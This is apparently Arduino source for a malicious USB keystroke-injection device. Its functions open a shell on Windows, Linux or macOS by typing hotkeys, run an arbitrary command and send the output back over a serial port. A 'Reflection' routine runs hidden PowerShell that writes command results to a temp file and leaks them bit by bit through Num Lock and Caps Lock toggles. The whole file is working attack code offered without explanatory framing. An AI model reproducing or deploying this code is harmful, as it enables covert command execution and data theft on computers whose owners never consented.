void exfilWin(char *SomeCommand){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(F("powershell"));
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(5000);
  Keyboard.print("$a=[System.IO.Ports.SerialPort]::getportnames();$attack=");
  delay(300);
  Keyboard.print(SomeCommand);
  delay(300);
  Keyboard.println(";$port=new-Object System.IO.Ports.SerialPort $a,115200,None,8,one;$port.open();$port.WriteLine(\"ExfilWin:$attack\");$port.close();exit;");
}

void exfilNix(char *SomeCommand){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("xterm");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.print("sleep .5;stty -F /dev/serial/by-id/*Raspberry* 115200;echo -e \"ExfilNix:\"$(");
  delay(2000);
  Keyboard.print(SomeCommand);
  delay(2000);
  Keyboard.print(")\"\" > /dev/serial/by-id/*Raspberry*");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.print("exit");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}

void exfilMac(char *SomeCommand){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(F("Terminal"));
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(3000);
  Keyboard.print(F("sleep .5;stty -F /dev/cu.usbmodemHID* 115200;echo -e \"ExfilMac:\"$("));
  delay(300);
  Keyboard.print(SomeCommand);
  delay(300);
  Keyboard.print(F(")\"\" > /dev/cu.usbmodemHID*"));
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}

int stage = 0;

void getStatusLeds() {
  delay(500);
  stage = 1;
  Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
  delay(3000);
  stage = 2;
}

void Reflection(char *SomeCommand){
  delay(1000);
  getStatusLeds();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell -WindowStyle hidden \"");
  delay(200);
  Keyboard.print(SomeCommand);
  delay(200);
  Keyboard.println(" | Out-File -encoding ascii $env:tmp\\z\"");
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("powershell -WindowStyle hidden \"foreach($b in $(cat $env:tmp\\z -En by)){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b-band$a){$o+='%{NUMLOCK}'}else{$o+='%{CAPSLOCK}'}}}; $o+='%{SCROLLLOCK}';echo $o >$env:tmp\\z\"");
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("powershell -WindowStyle hidden \"$o=(cat $env:tmp\\z);Add-Type -A System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait($o);rm $env:tmp\\z\"");
}
